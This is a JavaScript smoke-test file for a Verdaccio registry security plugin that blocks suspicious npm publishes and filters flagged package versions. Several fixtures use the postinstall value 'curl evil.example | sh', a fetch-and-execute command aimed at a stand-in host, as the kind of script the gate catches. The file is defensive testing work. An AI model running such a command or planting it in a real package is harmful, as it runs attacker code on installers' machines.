'use strict';

// Manual smoke test -- this repo has no test framework/build step for its
// plugins, but the publish-time gate parses the request body itself ahead
// of Verdaccio's own body-parser (see index.js's register_middlewares() for
// why that's safe), which has no other safety net. Run with:
//   node verdaccio-security-filter/test/smoke.js
// Spins up a real local HTTP server so the gate reads an actual request
// stream, exactly like it would in Verdaccio, rather than a hand-faked req.

const http = require('node:http');
const assert = require('node:assert/strict');
const {SecurityFilter} = require('../index.js');

const NOOP_LOGGER = {warn() {}, error() {}, info() {}, fatal() {}};

// Records every warn()/error() call's arguments so a test can assert on the
// exact fields logged, not just on the resulting block/reject decision --
// needed to confirm the CVE-vs-MAL log branch actually carries the right
// distinct fields (cveId/severity/cweIds vs malIds), not just "something".
function makeCapturingLogger() {
  const calls = {warn: [], error: [], fatal: []};
  return {
    warn: (...args) => calls.warn.push(args),
    error: (...args) => calls.error.push(args),
    fatal: (...args) => calls.fatal.push(args),
    info() {},
    calls,
  };
}

// A minimal stand-in for Verdaccio's Storage#getPackage -- only the parts
// _checkPublish() actually reads.
function makeFakeStorage() {
  const existingByName = new Map();
  return {
    setExisting(name, versions) {
      existingByName.set(name, {versions});
    },
    getPackage({name, callback}) {
      const existing = existingByName.get(name);
      if (!existing) return callback({status: 404}, null);
      callback(null, existing);
    },
  };
}

// Registers the plugin's middleware against a real http server so
// body-parser reads a genuine request stream, and shims just the
// Express-specific bits (req.path, res.status/json) the plugin relies on.
async function startServer(instance, storage) {
  let handler;
  instance.register_middlewares({use: fn => (handler = fn)}, null, storage);

  const server = http.createServer((req, res) => {
    req.path = new URL(req.url, 'http://localhost').pathname;
    res.status = function (code) {
      this.statusCode = code;
      return this;
    };
    res.json = function (body) {
      this.setHeader('content-type', 'application/json');
      this.end(JSON.stringify(body));
    };
    const next = err => {
      if (res.headersSent) return;
      if (err) {
        res.status(err.status || 500).json({error: err.message});
        return;
      }
      // Reaching here means the gate let the request through -- simulate
      // Verdaccio's own downstream publish handler succeeding.
      res.status(201).json({ok: true});
    };
    if (!handler) return next();
    handler(req, res, next);
  });

  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  return server;
}

function put(server, path, body) {
  const {port} = server.address();
  return fetch(`http://127.0.0.1:${port}${path}`, {
    method: 'PUT',
    headers: body === undefined ? {} : {'content-type': 'application/json'},
    body: body === undefined ? undefined : JSON.stringify(body),
  }).then(async res => ({
    status: res.status,
    body: await res.json().catch(() => null),
  }));
}

function withScripts(scripts) {
  return {scripts};
}

function daysAgo(n) {
  return new Date(Date.now() - n * 24 * 60 * 60 * 1000).toISOString();
}

// Builds a packument for direct filter_metadata() checks -- no HTTP server
// needed, unlike the publish-gate checks above, since filter_metadata is a
// plain async function. `entries` is `{ [version]: { publishedAt, ...meta } }`.
function makePackageInfo(name, entries, distTags = {}) {
  const versions = {};
  const time = {};
  for (const [ver, {publishedAt, ...meta}] of Object.entries(entries)) {
    versions[ver] = {
      version: ver,
      dist: {tarball: `https://example/${name}/-/${name}-${ver}.tgz`},
      ...meta,
    };
    time[ver] = publishedAt;
  }
  return {name, versions, time, 'dist-tags': {...distTags}};
}

function makeFakeBlocklist(matcher) {
  return {check: matcher};
}

async function main() {
  let passed = 0;

  async function check(name, fn) {
    try {
      await fn();
      passed++;
      console.log(`PASS: ${name}`);
    } catch (err) {
      console.error(`FAIL: ${name}`);
      console.error(err);
      process.exitCode = 1;
    }
  }

  function makeInstance(overrides = {}, optionsOverrides = {}) {
    return new SecurityFilter(
      {blockPublishWithNewScripts: true, ...overrides},
      {logger: NOOP_LOGGER, config: {}, ...optionsOverrides},
    );
  }

  await check(
    'brand-new package with an install script is allowed (no baseline to violate)',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(makeInstance(), storage);
      try {
        const {status} = await put(server, '/new-pkg', {
          versions: {
            '1.0.0': withScripts({postinstall: 'curl evil.example | sh'}),
          },
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a package that has always shipped install scripts is never blocked',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('native-addon', {
        '1.0.0': withScripts({install: 'node-gyp rebuild'}),
      });
      const server = await startServer(makeInstance(), storage);
      try {
        const {status} = await put(server, '/native-addon', {
          versions: {
            '1.0.0': withScripts({install: 'node-gyp rebuild'}),
            '1.1.0': withScripts({install: 'node-gyp rebuild'}),
          },
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a new version introducing a script against a clean history is rejected',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {
        '1.0.0': withScripts({}),
        '1.1.0': withScripts({}),
      });
      const server = await startServer(makeInstance(), storage);
      try {
        const {status, body} = await put(server, '/fortmesa-fmweb-fe', {
          versions: {
            '1.0.0': withScripts({}),
            '1.1.0': withScripts({}),
            '1.2.0': withScripts({postinstall: 'curl evil.example | sh'}),
          },
        });
        assert.equal(status, 403);
        assert.match(body.reason, /SECURITY BLOCK/);
        assert.match(body.reason, /1\.2\.0/);
        assert.match(body.reason, /postinstall/);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a new version with no script against a clean history is allowed',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
      const server = await startServer(makeInstance(), storage);
      try {
        const {status} = await put(server, '/fortmesa-fmweb-fe', {
          versions: {'1.0.0': withScripts({}), '1.1.0': withScripts({})},
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'resending only already-known versions (deprecate/star-shaped) is allowed',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
      const server = await startServer(makeInstance(), storage);
      try {
        const {status} = await put(server, '/fortmesa-fmweb-fe', {
          versions: {'1.0.0': {...withScripts({}), deprecated: 'use 2.x'}},
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check('the tarball-only upload route is never inspected', async () => {
    const storage = makeFakeStorage();
    storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
    const server = await startServer(makeInstance(), storage);
    try {
      const {status} = await put(
        server,
        '/fortmesa-fmweb-fe/-/fortmesa-fmweb-fe-1.2.0.tgz',
        undefined,
      );
      assert.equal(status, 201);
    } finally {
      server.close();
    }
  });

  await check('GET requests are never intercepted', async () => {
    const storage = makeFakeStorage();
    const server = await startServer(makeInstance(), storage);
    try {
      const {port} = server.address();
      const res = await fetch(`http://127.0.0.1:${port}/fortmesa-fmweb-fe`, {
        method: 'GET',
      });
      assert.equal(res.status, 201); // reached the fake "downstream" handler untouched
    } finally {
      server.close();
    }
  });

  await check(
    'disabled by config, the gate never blocks even an obvious violation',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
      const server = await startServer(
        makeInstance({blockPublishWithNewScripts: false}),
        storage,
      );
      try {
        const {status} = await put(server, '/fortmesa-fmweb-fe', {
          versions: {
            '1.0.0': withScripts({}),
            '1.1.0': withScripts({postinstall: 'curl evil.example | sh'}),
          },
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'malformed JSON is propagated as an error, not a hang or a false allow',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(makeInstance(), storage);
      try {
        const {port} = server.address();
        const res = await fetch(`http://127.0.0.1:${port}/fortmesa-fmweb-fe`, {
          method: 'PUT',
          headers: {'content-type': 'application/json'},
          body: '{not valid json',
        });
        assert.notEqual(res.status, 201);
      } finally {
        server.close();
      }
    },
  );

  // --- filter_metadata() direct checks: allow/block/OSV/date/replace ---

  await check('allow-list overrides an OSV blocklist hit', async () => {
    const fakeStore = makeFakeBlocklist(name =>
      name === '@evil/pkg' ? {malIds: ['MAL-1']} : null,
    );
    const instance = new SecurityFilter(
      {allow: ['@evil/*']},
      {logger: NOOP_LOGGER, config: {}, maliciousPackageStore: fakeStore},
    );
    const pkg = makePackageInfo('@evil/pkg', {
      '1.0.0': {publishedAt: daysAgo(10)},
    });
    const result = await instance.filter_metadata(pkg);
    assert.ok('1.0.0' in result.versions);
  });

  await check('allow-list overrides a manual block: rule', async () => {
    const instance = new SecurityFilter(
      {block: ['foo'], allow: [{foo: {versions: '1.0.0'}}]},
      {logger: NOOP_LOGGER, config: {}},
    );
    const pkg = makePackageInfo('foo', {
      '1.0.0': {publishedAt: daysAgo(10)},
      '2.0.0': {publishedAt: daysAgo(10)},
    });
    const result = await instance.filter_metadata(pkg);
    assert.ok('1.0.0' in result.versions);
    assert.ok(!('2.0.0' in result.versions));
  });

  await check(
    'manual block by scope removes every version under that scope',
    async () => {
      const instance = new SecurityFilter(
        {block: ['@bad/*']},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('@bad/thing', {
        '1.0.0': {publishedAt: daysAgo(10)},
        '2.0.0': {publishedAt: daysAgo(10)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.equal(Object.keys(result.versions).length, 0);
    },
  );

  await check(
    'manual block by version range blocks only matching versions and redirects the dist-tag',
    async () => {
      const instance = new SecurityFilter(
        {block: [{foo: {versions: '>=2.0.0'}}]},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo(
        'foo',
        {
          '1.0.0': {publishedAt: daysAgo(10)},
          '2.0.0': {publishedAt: daysAgo(9)},
          '3.0.0': {publishedAt: daysAgo(8)},
        },
        {latest: '3.0.0'},
      );
      const result = await instance.filter_metadata(pkg);
      assert.ok('1.0.0' in result.versions);
      assert.ok(!('2.0.0' in result.versions));
      assert.ok(!('3.0.0' in result.versions));
      assert.equal(result['dist-tags'].latest, '1.0.0');
    },
  );

  await check(
    'thresholdDate can be the more restrictive side of the combined cutoff',
    async () => {
      const instance = new SecurityFilter(
        {packageAge: {minDays: 0, thresholdDate: daysAgo(5)}},
        {logger: NOOP_LOGGER, config: {}},
      );
      // Passes minDays: 0 trivially, but falls inside the thresholdDate window.
      const pkg = makePackageInfo('foo', {'1.0.0': {publishedAt: daysAgo(2)}});
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
    },
  );

  await check(
    'minDays can be the more restrictive side of the combined cutoff',
    async () => {
      const instance = new SecurityFilter(
        {packageAge: {minDays: 30, thresholdDate: daysAgo(1)}},
        {logger: NOOP_LOGGER, config: {}},
      );
      // Passes thresholdDate (published before yesterday), but falls inside the minDays(30) window.
      const pkg = makePackageInfo('foo', {'1.0.0': {publishedAt: daysAgo(2)}});
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
    },
  );

  await check(
    'thresholdDate accepts a bare date (no time component)',
    async () => {
      const instance = new SecurityFilter(
        {packageAge: {minDays: 0, thresholdDate: '2026-01-01'}},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('foo', {
        '1.0.0': {publishedAt: '2025-12-31T00:00:00Z'},
        '2.0.0': {publishedAt: '2026-06-01T00:00:00Z'},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok(
        '1.0.0' in result.versions,
        'published before the bare thresholdDate should be served',
      );
      assert.ok(
        !('2.0.0' in result.versions),
        'published after the bare thresholdDate should be blocked',
      );
    },
  );

  await check(
    'manual block: strategy replace substitutes the nearest older version',
    async () => {
      const instance = new SecurityFilter(
        {block: [{foo: {versions: '2.0.0', strategy: 'replace'}}]},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('foo', {
        '1.0.0': {publishedAt: daysAgo(10)},
        '2.0.0': {publishedAt: daysAgo(9)},
      });
      const originalTime = {...pkg.time};
      const result = await instance.filter_metadata(pkg);
      assert.ok('2.0.0' in result.versions); // key kept, not removed
      assert.equal(result.versions['2.0.0'].version, '2.0.0'); // packument still claims to be 2.0.0
      assert.equal(
        result.versions['2.0.0'].dist.tarball,
        result.versions['1.0.0'].dist.tarball,
      ); // serves 1.0.0's real content
      assert.deepEqual(result.time, originalTime); // time/original entries untouched
    },
  );

  await check(
    'manual block: strategy replace falls back to remove when no substitute is available',
    async () => {
      const instance = new SecurityFilter(
        {block: [{foo: {versions: '1.0.0', strategy: 'replace'}}]},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('foo', {'1.0.0': {publishedAt: daysAgo(10)}}); // only version -- nothing to substitute with
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
    },
  );

  await check(
    'OSV blocklist hit blocks a version that passes every other check',
    async () => {
      const fakeStore = makeFakeBlocklist(name =>
        name === 'evil-pkg' ? {type: 'mal', malIds: ['MAL-123']} : null,
      );
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}, maliciousPackageStore: fakeStore},
      );
      const pkg = makePackageInfo('evil-pkg', {
        '1.0.0': {publishedAt: daysAgo(30)},
      }); // old enough, no scripts
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
    },
  );

  await check(
    'a CVE-shaped OSV hit logs cveId/severity/cweIds, distinctly from a MAL-shaped hit',
    async () => {
      const logger = makeCapturingLogger();
      const fakeStore = makeFakeBlocklist(name =>
        name === 'vuln-pkg'
          ? {
              type: 'cve',
              ids: ['GHSA-1'],
              cveId: 'CVE-2025-1',
              severity: 'HIGH',
              cweIds: ['CWE-79'],
            }
          : null,
      );
      const instance = new SecurityFilter(
        {},
        {logger, config: {}, maliciousPackageStore: fakeStore},
      );
      const pkg = makePackageInfo('vuln-pkg', {
        '1.0.0': {publishedAt: daysAgo(30)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('1.0.0' in result.versions));
      assert.equal(logger.calls.warn.length, 1);
      const [fields, message] = logger.calls.warn[0];
      assert.equal(fields.cveId, 'CVE-2025-1');
      assert.equal(fields.severity, 'HIGH');
      assert.deepEqual(fields.cweIds, ['CWE-79']);
      assert.equal(
        fields.malIds,
        undefined,
        'a CVE hit must not carry a malIds field',
      );
      assert.match(message, /known vulnerability/);
    },
  );

  await check(
    "osv.blockStrategy: 'replace' substitutes an OSV-flagged version like a manual replace rule would",
    async () => {
      const fakeStore = makeFakeBlocklist((name, ver) =>
        ver === '2.0.0' ? {malIds: ['MAL-1']} : null,
      );
      const instance = new SecurityFilter(
        {osv: {blockStrategy: 'replace'}},
        {logger: NOOP_LOGGER, config: {}, maliciousPackageStore: fakeStore},
      );
      const pkg = makePackageInfo('foo', {
        '1.0.0': {publishedAt: daysAgo(10)},
        '2.0.0': {publishedAt: daysAgo(9)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok('2.0.0' in result.versions);
      assert.equal(
        result.versions['2.0.0'].dist.tarball,
        result.versions['1.0.0'].dist.tarball,
      );
    },
  );

  await check(
    "osv.blockStrategy: 'remove' (the default) hard-removes an OSV-flagged version",
    async () => {
      const fakeStore = makeFakeBlocklist((name, ver) =>
        ver === '2.0.0' ? {malIds: ['MAL-1']} : null,
      );
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}, maliciousPackageStore: fakeStore},
      );
      const pkg = makePackageInfo('foo', {
        '1.0.0': {publishedAt: daysAgo(10)},
        '2.0.0': {publishedAt: daysAgo(9)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok(!('2.0.0' in result.versions));
    },
  );

  await check(
    'filter_metadata leaves an unremarkable package untouched',
    async () => {
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}},
      );
      const pkg = makePackageInfo('boring-pkg', {
        '1.0.0': {publishedAt: daysAgo(30)},
      });
      const result = await instance.filter_metadata(pkg);
      assert.ok('1.0.0' in result.versions);
    },
  );

  // --- Publish-gate checks: OSV/manual-block matches (blockPublishMatches) ---

  await check(
    'publish rejected on OSV blocklist match, even for a brand-new package',
    async () => {
      const storage = makeFakeStorage();
      const fakeStore = makeFakeBlocklist(name =>
        name === 'evil-pkg' ? {type: 'mal', malIds: ['MAL-1']} : null,
      );
      const server = await startServer(
        makeInstance(
          {blockPublishMatches: true},
          {maliciousPackageStore: fakeStore},
        ),
        storage,
      );
      try {
        const {status, body} = await put(server, '/evil-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 403);
        assert.match(body.reason, /SECURITY BLOCK/);
        assert.match(body.reason, /MAL-1/);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'publish rejected on a CVE-shaped OSV hit reports vulnerability detail, not malIds',
    async () => {
      const storage = makeFakeStorage();
      const logger = makeCapturingLogger();
      const fakeStore = makeFakeBlocklist(name =>
        name === 'vuln-pkg'
          ? {
              type: 'cve',
              ids: ['GHSA-1'],
              cveId: 'CVE-2025-1',
              severity: 'CRITICAL',
              cweIds: ['CWE-79'],
            }
          : null,
      );
      const server = await startServer(
        makeInstance(
          {blockPublishMatches: true},
          {logger, maliciousPackageStore: fakeStore},
        ),
        storage,
      );
      try {
        const {status, body} = await put(server, '/vuln-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 403);
        assert.match(body.reason, /CVE-2025-1/);
        assert.match(body.reason, /CRITICAL/);
        assert.equal(logger.calls.fatal.length, 1);
        const [fields] = logger.calls.fatal[0];
        assert.equal(fields.cveId, 'CVE-2025-1');
        assert.equal(
          fields.malIds,
          undefined,
          'a CVE hit must not carry a malIds field',
        );
      } finally {
        server.close();
      }
    },
  );

  await check(
    'publish rejected on manual block: match, even for a brand-new package',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(
        makeInstance({blockPublishMatches: true, block: ['bad-pkg']}),
        storage,
      );
      try {
        const {status, body} = await put(server, '/bad-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 403);
        assert.match(body.reason, /SECURITY BLOCK/);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'allow-list bypasses a manual block: match at publish time',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(
        makeInstance({
          blockPublishMatches: true,
          block: ['trusted-pkg'],
          allow: [{'trusted-pkg': {versions: '1.0.0'}}],
        }),
        storage,
      );
      try {
        const {status} = await put(server, '/trusted-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'blockPublishMatches and blockPublishWithNewScripts toggle independently',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('fortmesa-fmweb-fe', {'1.0.0': withScripts({})});
      const server = await startServer(
        makeInstance({
          blockPublishWithNewScripts: false,
          blockPublishMatches: true,
          block: ['bad-pkg'],
        }),
        storage,
      );
      try {
        const scriptResult = await put(server, '/fortmesa-fmweb-fe', {
          versions: {
            '1.0.0': withScripts({}),
            '1.1.0': withScripts({postinstall: 'curl evil.example | sh'}),
          },
        });
        assert.equal(scriptResult.status, 201); // script check is off, so this passes despite the new script

        const blockResult = await put(server, '/bad-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(blockResult.status, 403); // block-match check is still active
      } finally {
        server.close();
      }
    },
  );

  await check(
    'blockPublishMatches disabled by config never blocks even an obvious manual-block match',
    async () => {
      const storage = makeFakeStorage();
      const server = await startServer(
        makeInstance({
          blockPublishWithNewScripts: false,
          blockPublishMatches: false,
          block: ['bad-pkg'],
        }),
        storage,
      );
      try {
        const {status} = await put(server, '/bad-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  console.log(`\n${passed} check(s) passed.`);
}

main().catch(err => {
  console.error(err);
  process.exitCode = 1;
});
